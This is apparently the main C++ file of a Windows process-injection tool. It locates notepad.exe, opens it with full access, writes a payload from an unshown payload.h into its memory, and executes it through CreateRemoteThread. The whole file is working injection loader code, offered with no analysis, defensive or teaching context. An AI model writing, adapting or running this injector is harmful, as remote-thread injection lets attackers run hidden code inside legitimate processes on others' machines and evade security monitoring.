#include "payload.h"
#include "utils.h"
#include <codecvt>
#include <iostream>

int main() {
    std::wstring targetProcessName = L"notepad.exe"; // Name dont forget.

    DWORD processId = ProcessUtils::GetProcessIdByName(targetProcessName);
    if (processId == 0) {
        std::cerr << "Could not find process: " << std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(targetProcessName) << std::endl;
        return 1;
    }
    std::cout << "Found process ID: " << processId << std::endl;

    HANDLE hProcess = ProcessUtils::OpenProcessById(processId, PROCESS_ALL_ACCESS);
    if (hProcess == NULL) {
        return 1;
    }

    Payload::PayloadData payload = Payload::GetDefaultPayload();
    LPVOID remoteBuffer = NULL;
    if (!Payload::InjectPayload(hProcess, payload, &remoteBuffer)) {
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "Injection completed successfully!" << std::endl;
    return 0;
}